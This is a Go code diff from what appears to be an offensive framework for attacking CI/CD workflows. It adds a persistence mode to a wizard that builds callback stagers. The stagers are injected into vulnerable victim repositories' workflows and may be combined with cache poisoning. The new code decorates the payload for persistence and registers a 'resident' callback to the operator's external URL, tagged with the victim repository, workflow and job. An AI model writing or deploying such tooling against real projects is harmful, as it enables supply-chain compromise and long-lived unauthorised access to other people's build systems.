@@ -77,10 +77,23 @@ func (m *Model) prepareWizardStager(vuln *Vulnerability, injCtx rye.InjectionCon
 	}
 	stager := rye.NewStager(m.config.ExternalURL(), injCtx)
 	payload := prependGateTriggers(stager.Generate().Raw, vuln)
+	if m.wizard.PersistenceAttempt {
+		payload = decoratePayloadForPersistence(payload)
+	}
 	m.pendingCachePoison = nil
 	m.wizard.VictimStagerID = ""
 
 	if !m.wizard.CachePoisonEnabled {
+		if m.wizard.PersistenceAttempt {
+			callback, err := m.registerPersistentCallback(stager.ID, "", m.wizard.DwellTime, callbackMetadataForVulnerability(vuln))
+			if err != nil {
+				return stager, payload, err
+			}
+			if callback != nil {
+				m.upsertCallback(*callback)
+			}
+			return stager, payload, nil
+		}
 		if err := m.registerStagerForVuln(stager.ID, m.wizard.DwellTime, m.wizard.CallbackBudget, vuln); err != nil {
 			return stager, payload, err
 		}
@@ -143,6 +156,18 @@ func (m *Model) prepareWizardStager(vuln *Vulnerability, injCtx rye.InjectionCon
 		}
 	}
 	return stager, payload, nil
+}
+
+func callbackMetadataForVulnerability(vuln *Vulnerability) map[string]string {
+	if vuln == nil {
+		return nil
+	}
+	return map[string]string{
+		"repository":       vuln.Repository,
+		"workflow":         vuln.Workflow,
+		"job":              vuln.Job,
+		"persistence_mode": "resident",
+	}
 }
 
 func (m *Model) cachePoisonPurgeRequest(victim *cachepoison.VictimCandidate) (token, key, keyPrefix string) {
